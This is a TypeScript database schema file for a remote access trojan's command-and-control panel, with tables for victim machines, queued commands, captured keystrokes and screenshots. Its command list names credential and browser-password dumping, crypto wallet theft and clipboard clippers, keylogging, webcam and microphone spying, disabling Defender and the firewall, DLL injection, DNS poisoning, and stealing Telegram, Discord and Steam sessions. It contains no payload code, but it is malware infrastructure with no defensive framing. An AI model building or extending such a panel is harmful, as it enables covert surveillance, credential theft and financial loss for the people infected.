import { sql } from "drizzle-orm";
import { pgTable, text, varchar, integer, boolean, timestamp, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const serverConfig = pgTable("server_config", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  port: integer("port").notNull(),
  secretKey: text("secret_key").notNull(),
  domain: text("domain").notNull(),
  isActive: boolean("is_active").default(true),
});

export const targets = pgTable("targets", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  targetId: text("target_id").notNull().unique(),
  uniqueCode: text("unique_code").notNull().unique(),
  name: text("name").notNull(),
  ip: text("ip").notNull(),
  localIp: text("local_ip"),
  externalIp: text("external_ip"),
  os: text("os").notNull(),
  osVersion: text("os_version"),
  platform: text("platform").notNull().default("windows"),
  country: text("country").notNull(),
  city: text("city"),
  isp: text("isp"),
  status: text("status").notNull().default("online"),
  cpuModel: text("cpu_model"),
  ramSize: text("ram_size"),
  gpuModel: text("gpu_model"),
  screenResolution: text("screen_resolution"),
  antivirusInstalled: text("antivirus_installed"),
  isAdmin: boolean("is_admin").default(false),
  username: text("username"),
  hostname: text("hostname"),
  installedAt: timestamp("installed_at").defaultNow(),
  lastSeen: timestamp("last_seen").defaultNow(),
  lastScreenshot: text("last_screenshot"),
  isScreenSharing: boolean("is_screen_sharing").default(false),
});

export const commands = pgTable("commands", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  targetId: text("target_id").notNull(),
  command: text("command").notNull(),
  category: text("category").notNull(),
  params: jsonb("params"),
  status: text("status").notNull().default("pending"),
  result: text("result"),
  createdAt: timestamp("created_at").defaultNow(),
  executedAt: timestamp("executed_at"),
});

export const logs = pgTable("logs", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  message: text("message").notNull(),
  type: text("type").notNull().default("info"),
  targetId: text("target_id"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const keystrokes = pgTable("keystrokes", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  targetId: text("target_id").notNull(),
  window: text("window"),
  content: text("content").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const screenshots = pgTable("screenshots", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  targetId: text("target_id").notNull(),
  imageData: text("image_data"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const insertServerConfigSchema = createInsertSchema(serverConfig).omit({
  id: true,
  isActive: true,
});

export const insertTargetSchema = createInsertSchema(targets).omit({
  id: true,
  installedAt: true,
  lastSeen: true,
});

export const insertCommandSchema = createInsertSchema(commands).omit({
  id: true,
  createdAt: true,
  executedAt: true,
});

export const insertLogSchema = createInsertSchema(logs).omit({
  id: true,
  createdAt: true,
});

export const insertKeystrokeSchema = createInsertSchema(keystrokes).omit({
  id: true,
  createdAt: true,
});

export const insertScreenshotSchema = createInsertSchema(screenshots).omit({
  id: true,
  createdAt: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export type InsertServerConfig = z.infer<typeof insertServerConfigSchema>;
export type ServerConfig = typeof serverConfig.$inferSelect;

export type InsertTarget = z.infer<typeof insertTargetSchema>;
export type Target = typeof targets.$inferSelect;

export type InsertCommand = z.infer<typeof insertCommandSchema>;
export type Command = typeof commands.$inferSelect;

export type InsertLog = z.infer<typeof insertLogSchema>;
export type Log = typeof logs.$inferSelect;

export type InsertKeystroke = z.infer<typeof insertKeystrokeSchema>;
export type Keystroke = typeof keystrokes.$inferSelect;

export type InsertScreenshot = z.infer<typeof insertScreenshotSchema>;
export type Screenshot = typeof screenshots.$inferSelect;

export function generateUniqueCode(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 20; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

export const COMMAND_CATEGORIES = {
  SYSTEM: 'system',
  FILES: 'files',
  NETWORK: 'network',
  SURVEILLANCE: 'surveillance',
  PERSISTENCE: 'persistence',
  CREDENTIALS: 'credentials',
  REMOTE: 'remote',
  BROWSER: 'browser',
  MESSAGING: 'messaging',
  CRYPTO: 'crypto',
} as const;

export const AVAILABLE_COMMANDS = [
  { id: 'screenshot', name: 'Take Screenshot', category: 'surveillance', icon: 'Camera' },
  { id: 'screen_stream', name: 'Start Screen Stream', category: 'surveillance', icon: 'Monitor' },
  { id: 'stop_stream', name: 'Stop Screen Stream', category: 'surveillance', icon: 'MonitorOff' },
  { id: 'keylogger_start', name: 'Start Keylogger', category: 'surveillance', icon: 'Keyboard' },
  { id: 'keylogger_stop', name: 'Stop Keylogger', category: 'surveillance', icon: 'KeyboardOff' },
  { id: 'webcam_capture', name: 'Capture Webcam', category: 'surveillance', icon: 'Video' },
  { id: 'microphone_record', name: 'Record Microphone', category: 'surveillance', icon: 'Mic' },
  { id: 'clipboard_get', name: 'Get Clipboard', category: 'surveillance', icon: 'Clipboard' },
  { id: 'clipboard_set', name: 'Set Clipboard', category: 'surveillance', icon: 'ClipboardCopy' },
  { id: 'file_browse', name: 'Browse Files', category: 'files', icon: 'FolderOpen' },
  { id: 'file_download', name: 'Download File', category: 'files', icon: 'Download' },
  { id: 'file_upload', name: 'Upload File', category: 'files', icon: 'Upload' },
  { id: 'file_delete', name: 'Delete File', category: 'files', icon: 'Trash2' },
  { id: 'file_execute', name: 'Execute File', category: 'files', icon: 'Play' },
  { id: 'file_search', name: 'Search Files', category: 'files', icon: 'Search' },
  { id: 'file_compress', name: 'Compress Files', category: 'files', icon: 'Archive' },
  { id: 'shell_cmd', name: 'Execute Command', category: 'system', icon: 'Terminal' },
  { id: 'powershell', name: 'PowerShell Command', category: 'system', icon: 'Terminal' },
  { id: 'process_list', name: 'List Processes', category: 'system', icon: 'ListTree' },
  { id: 'process_kill', name: 'Kill Process', category: 'system', icon: 'XCircle' },
  { id: 'service_list', name: 'List Services', category: 'system', icon: 'Server' },
  { id: 'service_start', name: 'Start Service', category: 'system', icon: 'Play' },
  { id: 'service_stop', name: 'Stop Service', category: 'system', icon: 'Square' },
  { id: 'system_info', name: 'Get System Info', category: 'system', icon: 'Info' },
  { id: 'installed_apps', name: 'List Installed Apps', category: 'system', icon: 'Package' },
  { id: 'startup_list', name: 'List Startup Items', category: 'system', icon: 'Zap' },
  { id: 'shutdown', name: 'Shutdown PC', category: 'system', icon: 'Power' },
  { id: 'restart', name: 'Restart PC', category: 'system', icon: 'RefreshCw' },
  { id: 'lock_screen', name: 'Lock Screen', category: 'system', icon: 'Lock' },
  { id: 'logoff', name: 'Log Off User', category: 'system', icon: 'LogOut' },
  { id: 'bsod', name: 'Trigger BSOD', category: 'system', icon: 'AlertTriangle' },
  { id: 'disable_defender', name: 'Disable Defender', category: 'persistence', icon: 'ShieldOff' },
  { id: 'disable_firewall', name: 'Disable Firewall', category: 'persistence', icon: 'Shield' },
  { id: 'add_exclusion', name: 'Add AV Exclusion', category: 'persistence', icon: 'ShieldCheck' },
  { id: 'add_startup', name: 'Add to Startup', category: 'persistence', icon: 'Zap' },
  { id: 'remove_startup', name: 'Remove from Startup', category: 'persistence', icon: 'ZapOff' },
  { id: 'elevate', name: 'Elevate Privileges', category: 'persistence', icon: 'ArrowUp' },
  { id: 'hide_file', name: 'Hide File', category: 'persistence', icon: 'EyeOff' },
  { id: 'inject_dll', name: 'Inject DLL', category: 'persistence', icon: 'Syringe' },
  { id: 'wifi_passwords', name: 'Dump WiFi Passwords', category: 'credentials', icon: 'Wifi' },
  { id: 'browser_passwords', name: 'Dump Browser Passwords', category: 'credentials', icon: 'Key' },
  { id: 'browser_cookies', name: 'Dump Cookies', category: 'credentials', icon: 'Cookie' },
  { id: 'browser_history', name: 'Dump Browser History', category: 'credentials', icon: 'History' },
  { id: 'browser_bookmarks', name: 'Dump Bookmarks', category: 'credentials', icon: 'Bookmark' },
  { id: 'autofill_data', name: 'Dump Autofill Data', category: 'credentials', icon: 'FileText' },
  { id: 'rdp_credentials', name: 'Dump RDP Credentials', category: 'credentials', icon: 'Monitor' },
  { id: 'email_credentials', name: 'Dump Email Credentials', category: 'credentials', icon: 'Mail' },
  { id: 'ftp_credentials', name: 'Dump FTP Credentials', category: 'credentials', icon: 'Server' },
  { id: 'network_scan', name: 'Scan Network', category: 'network', icon: 'Radar' },
  { id: 'port_scan', name: 'Port Scan', category: 'network', icon: 'Search' },
  { id: 'arp_table', name: 'Get ARP Table', category: 'network', icon: 'Network' },
  { id: 'dns_cache', name: 'Get DNS Cache', category: 'network', icon: 'Globe' },
  { id: 'netstat', name: 'Netstat', category: 'network', icon: 'Activity' },
  { id: 'route_table', name: 'Route Table', category: 'network', icon: 'Map' },
  { id: 'hosts_file', name: 'Edit Hosts File', category: 'network', icon: 'FileEdit' },
  { id: 'proxy_set', name: 'Set Proxy', category: 'network', icon: 'Globe2' },
  { id: 'dns_poison', name: 'DNS Poisoning', category: 'network', icon: 'Skull' },
  { id: 'remote_desktop', name: 'Start Remote Desktop', category: 'remote', icon: 'Monitor' },
  { id: 'remote_shell', name: 'Remote Shell', category: 'remote', icon: 'Terminal' },
  { id: 'vnc_start', name: 'Start VNC', category: 'remote', icon: 'Cast' },
  { id: 'reverse_proxy', name: 'Reverse Proxy', category: 'remote', icon: 'ArrowLeftRight' },
  { id: 'socks_proxy', name: 'SOCKS Proxy', category: 'remote', icon: 'Network' },
  { id: 'message_box', name: 'Show Message Box', category: 'remote', icon: 'MessageSquare' },
  { id: 'play_sound', name: 'Play Sound', category: 'remote', icon: 'Volume2' },
  { id: 'open_url', name: 'Open URL', category: 'remote', icon: 'ExternalLink' },
  { id: 'wallpaper_change', name: 'Change Wallpaper', category: 'remote', icon: 'Image' },
  { id: 'mouse_control', name: 'Mouse Control', category: 'remote', icon: 'MousePointer' },
  { id: 'keyboard_control', name: 'Keyboard Control', category: 'remote', icon: 'Keyboard' },
  { id: 'crypto_wallets', name: 'Dump Crypto Wallets', category: 'crypto', icon: 'Wallet' },
  { id: 'clipper_btc', name: 'BTC Clipper', category: 'crypto', icon: 'Bitcoin' },
  { id: 'clipper_eth', name: 'ETH Clipper', category: 'crypto', icon: 'Coins' },
  { id: 'miner_start', name: 'Start Miner', category: 'crypto', icon: 'Cpu' },
  { id: 'miner_stop', name: 'Stop Miner', category: 'crypto', icon: 'Square' },
  { id: 'telegram_session', name: 'Steal Telegram Session', category: 'messaging', icon: 'Send' },
  { id: 'discord_token', name: 'Steal Discord Token', category: 'messaging', icon: 'MessageCircle' },
  { id: 'whatsapp_backup', name: 'Backup WhatsApp', category: 'messaging', icon: 'Phone' },
  { id: 'steam_session', name: 'Steal Steam Session', category: 'messaging', icon: 'Gamepad2' },
  { id: 'uninstall', name: 'Uninstall Agent', category: 'system', icon: 'Trash' },
] as const;
